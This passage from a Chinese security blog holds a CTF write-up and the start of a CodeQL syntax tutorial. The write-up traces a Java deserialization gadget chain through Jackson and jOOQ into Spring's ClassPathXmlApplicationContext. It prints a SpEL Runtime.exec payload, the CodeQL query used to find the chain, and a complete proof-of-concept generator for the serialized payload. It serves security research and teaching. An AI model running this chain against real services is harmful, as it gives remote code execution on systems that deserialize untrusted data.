class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;#&#123;T(Runtime).getRuntime().exec(&#x27;open -a Calculator&#x27;)&#125;&quot;</span>/&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:7777/poc.xml&quot;);</span><br></pre></td></tr></table></figure>\n<p>这样我们就可以达到命令执行的效果。然后我们就是如何来实例化这个类。</p>\n<h2 id=\"中间链思路\"><a href=\"#中间链思路\" class=\"headerlink\" title=\"中间链思路\"></a>中间链思路</h2><p>其实可以利用   EventListenerList ReadObject -&gt; toString 这个gadget。</p>\n<p><a href=\"https://xz.aliyun.com/t/15487\">https://xz.aliyun.com/t/15487</a>  今年羊城杯的时候遇到过。</p>\n<p>然后再利用jackson  toString -&gt; 任意get的这个gadget<br>然后寻找  任意get -&gt;  newInstance 这个 gadget 。这个链子我们用codeql寻找。</p>\n<p>然后我们以任意的get方法作为source，以 newInstance 方法作为sink点。进行查找。</p>\n<h2 id=\"codeql\"><a href=\"#codeql\" class=\"headerlink\" title=\"codeql\"></a>codeql</h2><p>经过codeql查询之后我们构建如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Source()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().indexOf(<span class=\"string\">&quot;get&quot;</span>) = <span class=\"number\">0</span> and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().length() &gt; <span class=\"number\">3</span> and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.fromSource() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.hasNoParameters()</span><br><span class=\"line\">        and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%jooq%&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;%newInstance%&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">1</span> </span><br><span class=\"line\">            and</span><br><span class=\"line\">            <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%jooq%&quot;</span>)</span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller() </span><br><span class=\"line\">        )</span><br><span class=\"line\">        and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png\"  alt=\"image-20241213151447092\" lazyload></a></p>\n<h3 id=\"链子分析\"><a href=\"#链子分析\" class=\"headerlink\" title=\"链子分析\"></a>链子分析</h3><p>我们还是从sink to source方向分析。<br>Convert$ConvertAll.from() </p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png\"  alt=\"image-20241213133621747\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png\"  alt=\"image-20241213125644892\" lazyload></a></p>\n<p>代码大致逻辑就是获取 toClass 的 Constructor ，获取 Constructor 的 ParameterType 。将from作为参数。然后实例化。</p>\n<p>我们需要将 constructor 设为 ClassPathXmlApplicationContext。再往前看就是这个类的 toClass属性。然后里面的这个参数需要通过 <code>Convert.convert(from, types[0])</code> 获取。</p>\n<p>跟进 <code>Convert.convert()</code>。返回的就是我们的 from。这个from需要是是一个Object类，然后值为<code>http://127.0.0.1:7777/poc.xml</code></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"  alt=\"image-20241213133224054\" lazyload></a></p>\n<p>然后看ConvertAll的构造函数，并看到了toClass如何赋值的。还有就是我们的这个from需要传入进来。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png\"  alt=\"image-20241213130234507\" lazyload></a></p>\n<p>Sink2Source，然后我们继续往上找。</p>\n<p>还是 Convert.convert() ，但是这次走的时else分支。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"  alt=\"image-20241213133224054\" lazyload></a></p>\n<p>在实例化的时候对我们toClass属性进行赋值。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png\"  alt=\"image-20241213134519741\" lazyload></a></p>\n<p>最后调用到ConvertAll的from。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png\"  alt=\"image-20241213134622868\" lazyload></a></p>\n<p>Sink2Source，继续找</p>\n<p>AbstractDataType.convert()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png\"  alt=\"image-20241213154104453\" lazyload></a></p>\n<p>AbstractDataType 没有 getType 方法。我们找一下它的继承关系。然后找到了DefaultDataType这个类的getType 方法。返回的是这个类的uType属性。然后这个object也就是我们上面说的那个from变量。需要是Object类，然后值为<code>http://127.0.0.1:7777/poc.xml</code></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png\"  alt=\"image-20241213154143689\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png\"  alt=\"image-20241213154348497\" lazyload></a></p>\n<p>Sink2Source，继续找</p>\n<p>ConvertedVal.getValue() </p>\n<p>然后这个 delegate.getValue() 是 <code>http://127.0.0.1:7777/poc.xml</code> 然后这个getDataType需要是DefaultDataType。我们这里初始化这个类用它的子类TableDataType。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png\"  alt=\"image-20241213154655516\" lazyload></a></p>\n<h3 id=\"构造\"><a href=\"#构造\" class=\"headerlink\" title=\"构造\"></a>构造</h3><p>然后我们将codeql分析的这部分进行构造。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Dual&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor1</span> <span class=\"operator\">=</span> clazz1.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor1.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">table</span> <span class=\"operator\">=</span> constructor1.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz2</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.TableDataType&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor2</span> <span class=\"operator\">=</span> clazz2.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">tableDataType</span> <span class=\"operator\">=</span> constructor2.newInstance(table);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz3</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Val&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor3</span> <span class=\"operator\">=</span> clazz3.getDeclaredConstructor(Object.class, DataType.class, <span class=\"type\">boolean</span>.class);</span><br><span class=\"line\">constructor3.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">val</span> <span class=\"operator\">=</span> constructor3.newInstance(<span class=\"string\">&quot;whatever&quot;</span>, tableDataType, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz4</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.ConvertedVal&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor4</span> <span class=\"operator\">=</span> clazz4.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor4.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">convertedVal</span> <span class=\"operator\">=</span> constructor4.newInstance(val, tableDataType);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;http://127.0.0.1:7777/poc.xml&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">type</span> <span class=\"operator\">=</span> ClassPathXmlApplicationContext.class;</span><br><span class=\"line\"></span><br><span class=\"line\">ReflectUtil.setFieldValue(val, <span class=\"string\">&quot;value&quot;</span>, value);</span><br><span class=\"line\">ReflectUtil.setFieldValue(tableDataType, <span class=\"string\">&quot;uType&quot;</span>, type);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> convertedVal.getClass().getMethod(<span class=\"string\">&quot;getValue&quot;</span>);</span><br><span class=\"line\">m.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">m.invoke(convertedVal);</span><br></pre></td></tr></table></figure>\n\n<p>最终的poc就如官方给的那样。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PocServer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        gen(<span class=\"string\">&quot;http://127.0.0.1:7777/poc.xml&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">gen</span><span class=\"params\">(String url)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Dual&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor1</span> <span class=\"operator\">=</span> clazz1.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor1.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">table</span> <span class=\"operator\">=</span> constructor1.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz2</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.TableDataType&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor2</span> <span class=\"operator\">=</span> clazz2.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">tableDataType</span> <span class=\"operator\">=</span> constructor2.newInstance(table);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz3</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Val&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor3</span> <span class=\"operator\">=</span> clazz3.getDeclaredConstructor(Object.class, DataType.class, <span class=\"type\">boolean</span>.class);</span><br><span class=\"line\">        constructor3.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">val</span> <span class=\"operator\">=</span> constructor3.newInstance(<span class=\"string\">&quot;whatever&quot;</span>, tableDataType, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz4</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.ConvertedVal&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor4</span> <span class=\"operator\">=</span> clazz4.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor4.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">convertedVal</span> <span class=\"operator\">=</span> constructor4.newInstance(val, tableDataType);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> url;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">type</span> <span class=\"operator\">=</span> ClassPathXmlApplicationContext.class;</span><br><span class=\"line\"></span><br><span class=\"line\">        ReflectUtil.setFieldValue(val, <span class=\"string\">&quot;value&quot;</span>, value);</span><br><span class=\"line\">        ReflectUtil.setFieldValue(tableDataType, <span class=\"string\">&quot;uType&quot;</span>, type);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">        ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">        ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">        ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(convertedVal);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">EventListenerList</span> <span class=\"variable\">eventListenerList</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">EventListenerList</span>();</span><br><span class=\"line\">        <span class=\"type\">UndoManager</span> <span class=\"variable\">undoManager</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UndoManager</span>();</span><br><span class=\"line\">        <span class=\"type\">Vector</span> <span class=\"variable\">vector</span> <span class=\"operator\">=</span> (Vector) ReflectUtil.getFieldValue(undoManager, <span class=\"string\">&quot;edits&quot;</span>);</span><br><span class=\"line\">        vector.add(pojoNode);</span><br><span class=\"line\">        ReflectUtil.setFieldValue(eventListenerList, <span class=\"string\">&quot;listenerList&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;InternalError.class, undoManager&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] data = SerializeUtil.serialize(eventListenerList);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(Base64.getEncoder().encodeToString(data));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"codeql-database\"><a href=\"#codeql-database\" class=\"headerlink\" title=\"codeql database\"></a>codeql database</h1><p>hutool和jooq的数据库都是 通过github action 直接生成的。但是导入mac 的话是无法成功的，但是windows可以。</p>\n<p><a href=\"https://www.cnblogs.com/kingbridge/articles/18100619\">https://www.cnblogs.com/kingbridge/articles/18100619</a></p>\n<p>jdk的数据库虽然题目是jdk17的，但是我用的是jdk8的数据库。这位作者已经弄好了，直接用即可。</p>\n<p><a href=\"https://blog.csdn.net/mole_exp/article/details/122330521\">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>\n<p>题目比较久远了，这里附上题目的附件。</p>\n<p><a href=\"https://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234\">https://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234</a></p>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>其实这个算不上是污点追踪，因为每一个类的里面的每一个属性都是可以通过反射或者一些其它的方式来进行赋值的。和我的另一篇文章其实不太一样。<a href=\"https://xz.aliyun.com/t/16468\">https://xz.aliyun.com/t/16468</a></p>\n<p>参考</p>\n<p><a href=\"https://xz.aliyun.com/t/14190\">https://xz.aliyun.com/t/14190</a></p>\n<p><a href=\"https://xz.aliyun.com/t/15487\">https://xz.aliyun.com/t/15487</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14298\">https://xz.aliyun.com/t/14298</a></p>\n"},{"title":"codeql基础语法学习","_content":"csdn上阅读体验更加，这个目录太长这里用着不太舒服\nhttps://blog.csdn.net/qq_72685284/article/details/144118176\n\n网上对于codeql的基础讲解的比较少，很多都是直接从codeql for java 或者直接拿一个靶场开始练习的。我通过对官方文档的一些翻译和加上自己的一些个人的理解和丰富合适的例子。帮助新人对codeql有一个基础的认识。因为好多英文名词并没有比较统一的翻译，所以我这里会标注一些关键的英文词的中文含义，很多意思还需要大家从英文的原文中体会其中的含义，同时方便大家结合文档进行查看。\n\n参考文档。\n\nhttps://codeql.github.com/docs/ql-language-reference/about-the-ql-language/\n\n# declarative languages\n\n声明式(declarative)是结果导向的，命令式(imperative)是过程导向的。它们都有自己适用的场景和局限，于是现实中的编程语言常常都有两者的身影。\n\ndeclarative 案例 ： SQL, HTML ,codeql\n\nimperative 案例 ： C, C++, Java\n\n>QL is a declarative, object-oriented(面向对象的) query language that is optimized(优化) to enable efficient analysis of hierarchical data structures, in particular, databases representing software artifacts.\n>\n>The syntax(语法) of QL is similar to SQL, but the semantics(语意) of QL are based on Datalog, a declarative logic programming language often used as a query language. This makes QL primarily a logic language, and all operations in QL are logical operations. Furthermore, QL inherits recursive(递归) predicates(谓语) from Datalog, and adds support for aggregates(聚合), making even complex queries concise(简洁) and simple. \n\n总之就是codeql的语法和常规的编程语言不太一样，他是基于datalog的，不能拿C,java 那类语言去类比，有很多的概念和专业用语都是不太一样的。\n\n> Object orientation(面向对象) is an important feature of QL. The benefits of object orientation are well known – it increases modularity(模块化), enables information hiding, and allows code reuse(复用). QL offers all these benefits without compromising(妥协) on its logical foundation. This is achieved by defining a simple object model where classes are modeled as predicates and inheritance as implication. The libraries made available for all supported languages make extensive use of classes and inheritance.\n\n与sql相比，codeql的语言功能更加丰富，增加了面相对象的特性。可以自定义谓词。\n\n# 谓词Properties\n\n谓词用于描述构成 QL 程序的逻辑关系。\n\n严格来说，谓词求值为一组元组。例如，考虑以下两个谓词定义：\n\n```java\npredicate isCountry(string country) {\n  country = \"Germany\"\n  or\n  country = \"Belgium\"\n  or\n  country = \"France\"\n}\n\npredicate hasCapital(string country, string capital) {\n  country = \"Belgium\" and capital = \"Brussels\"\n  or\n  country = \"Germany\" and capital = \"Berlin\"\n  or\n  country = \"France\" and capital = \"Paris\"\n}\n\nfrom string country, string capital\nwhere hasCapital(country, capital) and country = \"Germany\"\nselect country, capital\n```\n\n谓词 isCountry 返回的是一组一元组 {(\"Belgium\"),(\"Germany\"),(\"France\")}，而 hasCapital 是一组二元组 {(\"Belgium\",\"Brussels\"),(\"Germany\",\"Berlin\"),(\"France\",\"Paris\")}。这些谓词的元数分别为 1 和 2。\n\n通常，谓词中的所有元组都具有相同数量的元素。谓词的 arity 就是元素的数量，不包括可能的结果变量。\n\nQL 中有许多内置谓词。您可以在任何查询中使用这些谓词，而无需导入任何其他模块。除了这些内置谓词之外，您还可以定义自己的谓词：\n\n## 谓词组成\n\n- 谓词的关键字predicate，或者谓词的返回值。（谓词可以分为without result 和 with result）\n- 谓词名词\n- 谓词参数\n- 谓词主体\n\n## without result\n\n开头那两个谓词也是 without result 的\n\n```java\npredicate isSmall(int i) {\n    i in [1 .. 9]\n}\n\nfrom int i\nwhere isSmall(i)\nselect i\n```\n\n## with result\n\n您可以通过将关键字 predicate 替换为结果类型来定义带有结果的谓词。这引入了特殊变量 result。result的值就是我们的返回值。\n\n这个from就是定义一个变量。\n\n```java\nint getSuccessor(int i) {\n\tresult = i + 1 and\n\ti in [1 .. 9]\n}\n\nfrom int x\nselect x,getSuccessor(x)\n```\n\n可以在谓词主体中调用其他的谓词\n\n```java\nPerson getAChildOf(Person p) {\n  p = getAParentOf(result)\n}\n```\n\n谓词还可能对其参数的每个值产生多个结果（或根本没有结果）\n\n```java\nstring getANeighbor(string country) {\n\tcountry = \"France\" and result = \"Belgium\"\n\tor\n\tcountry = \"France\" and result = 